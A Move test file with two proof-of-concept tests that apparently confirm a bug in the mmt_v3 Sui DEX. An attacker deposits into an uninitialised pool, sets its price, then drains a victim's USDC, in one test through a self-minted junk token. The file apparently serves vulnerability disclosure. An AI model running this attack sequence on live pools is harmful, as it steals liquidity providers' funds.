#[test_only]
module mmt_v3::poc_uninit_pool_test;

use mmt_v3::create_pool;
use mmt_v3::global_config;
use mmt_v3::i32;
use mmt_v3::liquidity;
use mmt_v3::pool;
use mmt_v3::position;
use mmt_v3::test_helper::{Self as th, USDC};
use mmt_v3::tick_math;
use mmt_v3::version;
use sui::clock;
use sui::coin;
use sui::sui::SUI;
use sui::test_scenario;

const POOL_CREATOR: address = @0xAF;
const ATTACKER: address = @0xB0B;
const VICTIM: address = @0xA11CE;

/// -------------------------------------------------------------------------
/// Phantom-Liquidity-via-Uninitialized-Pool drain probe.
///
/// Mechanic:
///   While pool.sqrt_price == 0, add_liquidity falls into the
///   current <= sqrt_lower branch of get_liquidity_for_amounts, which
///   prices the deposit as out-of-range-below (only X required).
///
///   We make the attacker's position out-of-range at the default tick = 0
///   so the in-range active-branch (which would call oracle::write on
///   empty observations and abort) is skipped.
///
///   Then pool::initialize is called with a sqrt_price INSIDE the
///   attacker's range, making the position retroactively in-range. The
///   attacker's position holds L liquidity but the pool reserves only have X.
///
///   A victim Bob deposits at a normal in-range position. Pool reserves now
///   contain Y from Bob.
///
///   Attacker removes their L. They are owed (amount_x, amount_y) priced at
///   the in-range sqrt_price. The amount_y comes from Bob's reserve_y.
///
/// Final question:  attacker_received_x  +  attacker_received_y
///                  > attacker_paid_x  +  attacker_paid_y ?
#[test]
public fun uninit_pool_phantom_liquidity_drain() {
    let mut scenario = test_scenario::begin(POOL_CREATOR);
    let version = th::take_version(test_scenario::ctx(&mut scenario));
    th::setup(test_scenario::ctx(&mut scenario));

    test_scenario::next_tx(&mut scenario, ATTACKER);

    //
    // ATTACKER SETUP PTB: create + malformed-deposit + initialize + share
    //
    let mut global_config = test_scenario::take_shared<global_config::GlobalConfig>(&mut scenario);
    let mut pool = create_pool::new<SUI, USDC>(
        &mut global_config,
        100, // fee tier 0.01%, tick spacing 2
        &version,
        test_scenario::ctx(&mut scenario),
    );
    test_scenario::return_shared(global_config);

    assert!(pool::sqrt_price(&pool) == 0, 1);

    // Out-of-range-above at default tick=0: lower=10, upper=100 (tick spacing 2).
    let atk_lower = i32::from(10);
    let atk_upper = i32::from(100);
    let mut attacker_position = liquidity::open_position<SUI, USDC>(
        &mut pool,
        atk_lower,
        atk_upper,
        &version,
        test_scenario::ctx(&mut scenario),
    );

    let attacker_x_in: u64 = 100_000_000_000;
    let coin_x = coin::mint_for_testing<SUI>(attacker_x_in, test_scenario::ctx(&mut scenario));
    let coin_y_zero = coin::zero<USDC>(test_scenario::ctx(&mut scenario));
    let clock = clock::create_for_testing(test_scenario::ctx(&mut scenario));

    let (refund_x, refund_y) = liquidity::add_liquidity<SUI, USDC>(
        &mut pool,
        &mut attacker_position,
        coin_x,
        coin_y_zero,
        0, 0,
        &clock, &version,
        test_scenario::ctx(&mut scenario),
    );

    let attacker_x_paid = attacker_x_in - coin::value(&refund_x);
    let attacker_y_paid = 0u64 - coin::value(&refund_y); // = 0 (no Y paid)
    coin::burn_for_testing(refund_x);
    coin::burn_for_testing(refund_y);

    let attacker_l = position::liquidity(&attacker_position);
    let pool_liq_pre = pool::liquidity(&pool);
    let (rx_pre, ry_pre) = pool::reserves(&pool);

    std::debug::print(&b"== After malformed deposit (uninit, X-only) ==");
    std::debug::print(&b"attacker.position.liquidity:");
    std::debug::print(&attacker_l);
    std::debug::print(&b"pool.liquidity (active count):");
    std::debug::print(&pool_liq_pre);
    std::debug::print(&b"pool.reserve_x:"); std::debug::print(&rx_pre);
    std::debug::print(&b"pool.reserve_y:"); std::debug::print(&ry_pre);
    std::debug::print(&b"attacker actually paid X:");
    std::debug::print(&attacker_x_paid);

    // Initialize INSIDE attacker's range (tick = 50) so position becomes
    // in-range at the post-share state.
    let init_sqrt = tick_math::get_sqrt_price_at_tick(i32::from(50));
    pool::initialize<SUI, USDC>(&mut pool, init_sqrt, &clock);

    pool::transfer<SUI, USDC>(pool);
    sui::transfer::public_transfer(attacker_position, ATTACKER);

    //
    // VICTIM (BOB) PTB: legitimately deposits at the now-shared, "valid-looking" pool.
    // Bob's range straddles current tick=50, so he's in-range and pays both X and Y.
    //
    test_scenario::next_tx(&mut scenario, VICTIM);
    let mut pool = th::take_pool<SUI, USDC>(&mut scenario);

    let bob_lower = i32::from(40);
    let bob_upper = i32::from(60);
    let mut bob_position = liquidity::open_position<SUI, USDC>(
        &mut pool, bob_lower, bob_upper, &version,
        test_scenario::ctx(&mut scenario),
    );

    let bob_x_in: u64 = 100_000_000_000;
    let bob_y_in: u64 = 100_000_000_000;
    let bob_coin_x = coin::mint_for_testing<SUI>(bob_x_in, test_scenario::ctx(&mut scenario));
    let bob_coin_y = coin::mint_for_testing<USDC>(bob_y_in, test_scenario::ctx(&mut scenario));

    let (br_x, br_y) = liquidity::add_liquidity<SUI, USDC>(
        &mut pool, &mut bob_position,
        bob_coin_x, bob_coin_y, 0, 0,
        &clock, &version, test_scenario::ctx(&mut scenario),
    );

    let bob_x_paid = bob_x_in - coin::value(&br_x);
    let bob_y_paid = bob_y_in - coin::value(&br_y);
    coin::burn_for_testing(br_x);
    coin::burn_for_testing(br_y);

    let (rx_after_bob, ry_after_bob) = pool::reserves(&pool);
    let pool_liq_after_bob = pool::liquidity(&pool);

    std::debug::print(&b"== After Bob legit deposit ==");
    std::debug::print(&b"bob paid X:"); std::debug::print(&bob_x_paid);
    std::debug::print(&b"bob paid Y:"); std::debug::print(&bob_y_paid);
    std::debug::print(&b"pool.liquidity:"); std::debug::print(&pool_liq_after_bob);
    std::debug::print(&b"pool.reserve_x:"); std::debug::print(&rx_after_bob);
    std::debug::print(&b"pool.reserve_y:"); std::debug::print(&ry_after_bob);

    sui::transfer::public_transfer(bob_position, VICTIM);
    th::return_pool<SUI, USDC>(pool);

    //
    // ATTACKER WITHDRAW PTB
    //
    test_scenario::next_tx(&mut scenario, ATTACKER);
    let mut pool = th::take_pool<SUI, USDC>(&mut scenario);
    let mut attacker_position = th::take_position(&mut scenario, ATTACKER);

    let l_to_remove = position::liquidity(&attacker_position);
    let (atk_out_x, atk_out_y) = liquidity::remove_liquidity<SUI, USDC>(
        &mut pool, &mut attacker_position, l_to_remove,
        0, 0, &clock, &version, test_scenario::ctx(&mut scenario),
    );

    let attacker_received_x = coin::value(&atk_out_x);
    let attacker_received_y = coin::value(&atk_out_y);

    std::debug::print(&b"== Attacker withdraw ==");
    std::debug::print(&b"attacker received X:"); std::debug::print(&attacker_received_x);
    std::debug::print(&b"attacker received Y:"); std::debug::print(&attacker_received_y);

    let net_x_gain = if (attacker_received_x > attacker_x_paid)
        attacker_received_x - attacker_x_paid else 0;
    let net_x_loss = if (attacker_x_paid > attacker_received_x)
        attacker_x_paid - attacker_received_x else 0;
    let net_y_gain = if (attacker_received_y > attacker_y_paid)
        attacker_received_y - attacker_y_paid else 0;

    std::debug::print(&b"attacker NET X gain:"); std::debug::print(&net_x_gain);
    std::debug::print(&b"attacker NET X loss:"); std::debug::print(&net_x_loss);
    std::debug::print(&b"attacker NET Y gain:"); std::debug::print(&net_y_gain);

    //
    // BOB withdraw - attempt MAX extractable to confirm pool is broken.
    //
    let mut bob_position = th::take_position(&mut scenario, VICTIM);
    let pool_liq_now = pool::liquidity(&pool);
    let bob_l_full = position::liquidity(&bob_position);

    // Bob can only safely remove up to pool.liquidity (else add_delta aborts
    // with insufficient_liquidity). We request the maximum possible.
    let bob_l_to_remove = if (bob_l_full > pool_liq_now) pool_liq_now else bob_l_full;

    std::debug::print(&b"== Pool state at Bob's withdraw ==");
    std::debug::print(&b"pool.liquidity (post-attacker-extract):"); std::debug::print(&pool_liq_now);
    std::debug::print(&b"bob.position.liquidity:"); std::debug::print(&bob_l_full);
    std::debug::print(&b"bob can remove (capped):"); std::debug::print(&bob_l_to_remove);

    let bob_locked_l = bob_l_full - bob_l_to_remove;
    std::debug::print(&b"bob LOCKED liquidity (cannot redeem):");
    std::debug::print(&bob_locked_l);

    let (bob_out_x, bob_out_y) = liquidity::remove_liquidity<SUI, USDC>(
        &mut pool, &mut bob_position, bob_l_to_remove,
        0, 0, &clock, &version, test_scenario::ctx(&mut scenario),
    );

    let bob_received_x = coin::value(&bob_out_x);
    let bob_received_y = coin::value(&bob_out_y);
    let bob_x_loss = if (bob_x_paid > bob_received_x) bob_x_paid - bob_received_x else 0;
    let bob_y_loss = if (bob_y_paid > bob_received_y) bob_y_paid - bob_received_y else 0;

    std::debug::print(&b"== Bob partial withdraw ==");
    std::debug::print(&b"bob received X:"); std::debug::print(&bob_received_x);
    std::debug::print(&b"bob received Y:"); std::debug::print(&bob_received_y);
    std::debug::print(&b"bob X loss vs deposit:"); std::debug::print(&bob_x_loss);
    std::debug::print(&b"bob Y loss vs deposit:"); std::debug::print(&bob_y_loss);

    // ========== HARD VERDICT: ATTACKER WALKED OUT WITH NET-POSITIVE Y ==========
    //
    // Attacker paid 0 Y at deposit time and received attacker_received_y Y
    // at withdrawal. Any positive value is a direct increase in their Y balance
    // sourced from victim funds — i.e., fund theft.
    assert!(net_y_gain > 0, 0xDEAD);
    // Additionally verify pool actually shipped Y to attacker (not stuck zero):
    assert!(attacker_received_y > 0, 0xDEAD);

    // Cleanup
    coin::burn_for_testing(atk_out_x);
    coin::burn_for_testing(atk_out_y);
    coin::burn_for_testing(bob_out_x);
    coin::burn_for_testing(bob_out_y);

    liquidity::close_position(attacker_position, &version, test_scenario::ctx(&mut scenario));
    // Bob's position still has locked liquidity, so it is NOT empty -> we
    // cannot call close_position on it.  Just transfer it back to keep the
    // test scenario clean.
    sui::transfer::public_transfer(bob_position, VICTIM);

    th::return_pool<SUI, USDC>(pool);
    clock::destroy_for_testing(clock);
    version::destroy_version_for_testing(version);
    test_scenario::end(scenario);
}

// =============================================================================
// ASYMMETRIC TOKEN PAIR — JUNK SUI vs VALUABLE USDC
// =============================================================================
//
// Scenario:
//   * Token X = "junk SUI" — the attacker is its minter/issuer. It is worthless
//     in real markets (e.g., a shitcoin or test token). The attacker can mint
//     unlimited supply at zero cost.
//   * Token Y = USDC — real, fungible, stable, pegged to USD ($1 per 1_000_000
//     raw units, i.e., USDC has 6 decimals).
//
// The attacker exploits the uninitialized-pool deposit bug:
//   1. Mints 1 trillion units of junk SUI (USD cost = $0).
//   2. Creates a pool, deposits the junk SUI into an out-of-range position
//      while pool.sqrt_price = 0 (X-only path).
//   3. Initializes the pool at a sqrt_price near the UPPER tick of the
//      attacker's range, maximizing the eventual Y extraction.
//   4. Shares the pool. A whale LP (Bob) sees a fresh-looking pool with valid
//      sqrt_price and deposits ≈$1M USDC + matching junk SUI as a normal
//      in-range LP would.
//   5. Attacker removes their phantom L. They receive minimal junk SUI back
//      AND a large amount of USDC sourced directly from Bob's reserve_y.
//
// Final accounting (printed and asserted):
//   attacker_USDC_received                 (REAL value)
//   attacker_junk_SUI_lost                 (ZERO real value)
//   ==> Attacker's net USD profit = USDC received  -  $0 cost = USDC received.
//
// Triage-grade assertion:
//   attacker_received_y > 0
//   AND  bob's net Y loss == attacker's Y gain (1-to-1 transfer)
#[test]
public fun asymmetric_pair_junk_x_vs_usdc_drain() {
    let mut scenario = test_scenario::begin(POOL_CREATOR);
    let version = th::take_version(test_scenario::ctx(&mut scenario));
    th::setup(test_scenario::ctx(&mut scenario));

    test_scenario::next_tx(&mut scenario, ATTACKER);

    //
    // (1) Attacker creates pool and runs the malformed-deposit flow in their PTB.
    //
    let mut global_config = test_scenario::take_shared<global_config::GlobalConfig>(&mut scenario);
    let mut pool = create_pool::new<SUI, USDC>(
        &mut global_config,
        100,
        &version,
        test_scenario::ctx(&mut scenario),
    );
    test_scenario::return_shared(global_config);

    assert!(pool::sqrt_price(&pool) == 0, 1);

    // Out-of-range-above at default tick=0; range [10, 100], spacing 2 (fee=100).
    let atk_lower = i32::from(10);
    let atk_upper = i32::from(100);
    let mut attacker_position = liquidity::open_position<SUI, USDC>(
        &mut pool, atk_lower, atk_upper, &version,
        test_scenario::ctx(&mut scenario),
    );

    // 1 trillion raw units of "junk SUI" minted by the attacker themselves.
    // Real-world value = $0 (worthless token they control).
    let attacker_x_minted: u64 = 1_000_000_000_000;
    let coin_x = coin::mint_for_testing<SUI>(attacker_x_minted, test_scenario::ctx(&mut scenario));
    let coin_y_zero = coin::zero<USDC>(test_scenario::ctx(&mut scenario));
    let clock = clock::create_for_testing(test_scenario::ctx(&mut scenario));

    let (refund_x, refund_y) = liquidity::add_liquidity<SUI, USDC>(
        &mut pool, &mut attacker_position, coin_x, coin_y_zero, 0, 0,
        &clock, &version, test_scenario::ctx(&mut scenario),
    );

    let attacker_x_paid = attacker_x_minted - coin::value(&refund_x);
    coin::burn_for_testing(refund_x);
    coin::burn_for_testing(refund_y);

    let attacker_l = position::liquidity(&attacker_position);

    std::debug::print(&b"=== ASYMMETRIC PAIR: JUNK SUI vs USDC ===");
    std::debug::print(&b"attacker minted junk SUI (free):");
    std::debug::print(&attacker_x_minted);
    std::debug::print(&b"attacker.position.liquidity (phantom L):");
    std::debug::print(&attacker_l);
    std::debug::print(&b"attacker actually paid junk SUI (locked):");
    std::debug::print(&attacker_x_paid);

    // Initialize at tick 98 (near the upper bound of attacker's range) to
    // MAXIMIZE the Y extraction at withdrawal. tick spacing 2, so 98 is valid.
    let init_sqrt = tick_math::get_sqrt_price_at_tick(i32::from(98));
    pool::initialize<SUI, USDC>(&mut pool, init_sqrt, &clock);

    pool::transfer<SUI, USDC>(pool);
    sui::transfer::public_transfer(attacker_position, ATTACKER);

    //
    // (2) Bob the whale LP deposits at the now-shared, valid-looking pool.
    //     Bob is in-range at tick 98 with range [90, 100].
    //     Real-world stake: ≈ $1M USDC + matching junk SUI.
    //
    test_scenario::next_tx(&mut scenario, VICTIM);
    let mut pool = th::take_pool<SUI, USDC>(&mut scenario);

    let bob_lower = i32::from(90);
    let bob_upper = i32::from(100);
    let mut bob_position = liquidity::open_position<SUI, USDC>(
        &mut pool, bob_lower, bob_upper, &version,
        test_scenario::ctx(&mut scenario),
    );

    // Bob deposits 1T junk SUI + 1T raw USDC = 1,000,000 USDC = $1,000,000 USD.
    let bob_x_in: u64 = 1_000_000_000_000;
    let bob_y_in: u64 = 1_000_000_000_000;
    let bob_coin_x = coin::mint_for_testing<SUI>(bob_x_in, test_scenario::ctx(&mut scenario));
    let bob_coin_y = coin::mint_for_testing<USDC>(bob_y_in, test_scenario::ctx(&mut scenario));

    let (br_x, br_y) = liquidity::add_liquidity<SUI, USDC>(
        &mut pool, &mut bob_position, bob_coin_x, bob_coin_y, 0, 0,
        &clock, &version, test_scenario::ctx(&mut scenario),
    );

    let bob_x_paid = bob_x_in - coin::value(&br_x);
    let bob_y_paid = bob_y_in - coin::value(&br_y);
    coin::burn_for_testing(br_x);
    coin::burn_for_testing(br_y);

    std::debug::print(&b"--- Bob (whale LP) deposit ---");
    std::debug::print(&b"bob junk SUI paid (raw):"); std::debug::print(&bob_x_paid);
    std::debug::print(&b"bob USDC paid (raw, 6-dec):"); std::debug::print(&bob_y_paid);

    sui::transfer::public_transfer(bob_position, VICTIM);
    th::return_pool<SUI, USDC>(pool);

    //
    // (3) Attacker withdraws their phantom L.
    //
    test_scenario::next_tx(&mut scenario, ATTACKER);
    let mut pool = th::take_pool<SUI, USDC>(&mut scenario);
    let mut attacker_position = th::take_position(&mut scenario, ATTACKER);

    let l_to_remove = position::liquidity(&attacker_position);
    let (atk_out_x, atk_out_y) = liquidity::remove_liquidity<SUI, USDC>(
        &mut pool, &mut attacker_position, l_to_remove,
        0, 0, &clock, &version, test_scenario::ctx(&mut scenario),
    );

    let attacker_received_x = coin::value(&atk_out_x);
    let attacker_received_y = coin::value(&atk_out_y);

    std::debug::print(&b"--- Attacker withdraw ---");
    std::debug::print(&b"attacker received junk SUI (raw):");
    std::debug::print(&attacker_received_x);
    std::debug::print(&b"attacker received USDC (raw, 6-dec):");
    std::debug::print(&attacker_received_y);

    let net_y_gain = attacker_received_y; // attacker paid 0 Y, so gain = received

    //
    // (4) USD-PROFIT ACCOUNTING
    //
    // junk SUI value-per-raw-unit = 0.
    // USDC value-per-raw-unit = $1 / 1_000_000  (6 decimals).
    //
    // attacker_usd_profit = (attacker_received_y / 1_000_000)  USD
    //                       - (attacker_x_paid * 0)  USD
    //                       = attacker_received_y / 1_000_000  USD.
    //
    let attacker_usd_profit = attacker_received_y / 1_000_000; // dollars

    std::debug::print(&b"=== ATTACKER'S NET USD PROFIT ===");
    std::debug::print(&b"USDC received (raw):");
    std::debug::print(&attacker_received_y);
    std::debug::print(&b"USDC profit (whole dollars):");
    std::debug::print(&attacker_usd_profit);
    std::debug::print(&b"junk SUI lost (worthless):");
    std::debug::print(&(attacker_x_paid - attacker_received_x));

    //
    // (5) Conservation check vs. Bob's reserve_y.
    //
    let pool_liq_now = pool::liquidity(&pool);
    let mut bob_position = th::take_position(&mut scenario, VICTIM);
    let bob_l_full = position::liquidity(&bob_position);
    let bob_l_to_remove = if (bob_l_full > pool_liq_now) pool_liq_now else bob_l_full;

    let (bob_out_x, bob_out_y) = liquidity::remove_liquidity<SUI, USDC>(
        &mut pool, &mut bob_position, bob_l_to_remove,
        0, 0, &clock, &version, test_scenario::ctx(&mut scenario),
    );

    let bob_received_y = coin::value(&bob_out_y);
    let bob_y_loss = if (bob_y_paid > bob_received_y) bob_y_paid - bob_received_y else 0;

    std::debug::print(&b"--- Bob max-redeem ---");
    std::debug::print(&b"bob USDC received back (raw):"); std::debug::print(&bob_received_y);
    std::debug::print(&b"bob USDC LOSS (raw):"); std::debug::print(&bob_y_loss);
    std::debug::print(&b"bob USDC LOSS (whole dollars):");
    std::debug::print(&(bob_y_loss / 1_000_000));

    //
    // ============== HARD VERDICT ==============
    //
    // (a) Attacker walked out with strictly positive USDC at zero USD cost.
    assert!(attacker_received_y > 0, 0xDEAD);
    assert!(attacker_usd_profit > 0, 0xDEAD);

    // (b) Conservation: Bob's USDC loss is (approximately) the attacker's gain.
    //     Allow for 1 wei rounding.
    let diff = if (bob_y_loss > attacker_received_y) bob_y_loss - attacker_received_y
               else attacker_received_y - bob_y_loss;
    assert!(diff <= 1, 0xDEAD);

    // Cleanup
    coin::burn_for_testing(atk_out_x);
    coin::burn_for_testing(atk_out_y);
    coin::burn_for_testing(bob_out_x);
    coin::burn_for_testing(bob_out_y);

    liquidity::close_position(attacker_position, &version, test_scenario::ctx(&mut scenario));
    sui::transfer::public_transfer(bob_position, VICTIM);

    th::return_pool<SUI, USDC>(pool);
    clock::destroy_for_testing(clock);
    version::destroy_version_for_testing(version);
    test_scenario::end(scenario);
}
